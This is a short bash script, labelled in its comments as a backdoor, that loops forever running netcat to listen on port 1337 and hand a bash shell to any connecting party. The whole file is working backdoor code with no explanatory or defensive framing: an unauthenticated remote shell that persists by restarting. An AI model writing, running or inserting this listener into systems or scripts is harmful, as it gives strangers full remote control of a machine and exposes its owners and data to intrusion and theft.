#!/bin/bash

# Set the port to listen on
PORT=1337

# Create the backdoor
while true
do
    nc -lp $PORT -e /bin/bash
done
